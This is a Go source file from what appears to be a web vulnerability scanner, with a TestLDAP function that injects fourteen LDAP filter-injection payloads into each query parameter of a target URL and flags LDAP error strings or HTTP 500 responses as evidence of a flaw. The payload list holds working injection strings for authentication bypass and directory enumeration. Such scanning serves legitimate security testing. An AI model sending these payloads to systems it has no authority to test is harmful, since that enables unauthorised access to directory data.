package native

import (
	"fmt"
	"net/http"
	"strings"
	"time"
)

type LDAPResult struct {
	Endpoint   string `json:"endpoint"`
	Parameter  string `json:"parameter"`
	Payload    string `json:"payload"`
	Vulnerable bool   `json:"vulnerable"`
	Evidence   string `json:"evidence"`
}

func TestLDAP(baseURL string, params map[string]string) []LDAPResult {
	payloads := []string{
		"*",
		"*)(&",
		"*)(uid=*",
		"*)(|(uid=*",
		"admin*",
		"admin*)((|userpassword=*)",
		"*)(cn=*))",
		"*)(|(cn=*))",
		"*)(uid=*))",
		"*)(|(uid=*))",
		"admin)(cn=*))",
		"admin)(|(cn=*))",
		"*))(|(cn=",
		"*))(|(uid=",
	}

	ldapIndicators := []string{
		"LDAP:", "ldap:", "javax.naming", "NamingException",
		"InvalidSearchFilter", "SearchFilter", "LDAPException",
		"com.sun.jndi", "CN=", "OU=", "DC=",
	}

	client := &http.Client{Timeout: 10 * time.Second}
	var results []LDAPResult

	for param := range params {
		for _, payload := range payloads {
			req, _ := http.NewRequest("GET", baseURL, nil)
			q := req.URL.Query()
			for k, v := range params {
				if k == param {
					q.Set(k, v+payload)
				} else {
					q.Set(k, v)
				}
			}
			req.URL.RawQuery = q.Encode()

			resp, err := client.Do(req)
			if err != nil {
				continue
			}

			body := ""
			buf := make([]byte, 2048)
			n, _ := resp.Body.Read(buf)
			body = string(buf[:n])
			resp.Body.Close()

			for _, ind := range ldapIndicators {
				if strings.Contains(body, ind) {
					results = append(results, LDAPResult{
						Endpoint:   baseURL,
						Parameter:  param,
						Payload:    payload,
						Vulnerable: true,
						Evidence:   fmt.Sprintf("LDAP error '%s' detected on param %s", ind, param),
					})
					break
				}
			}

			if resp.StatusCode == 500 {
				results = append(results, LDAPResult{
					Endpoint:   baseURL,
					Parameter:  param,
					Payload:    payload,
					Vulnerable: true,
					Evidence:   fmt.Sprintf("HTTP 500 with LDAP payload on param %s", param),
				})
			}
		}
	}

	if len(results) == 0 {
		results = append(results, LDAPResult{
			Endpoint: baseURL,
			Evidence: fmt.Sprintf("No LDAP injection detected across %d payloads", len(payloads)),
		})
	}

	return results
}
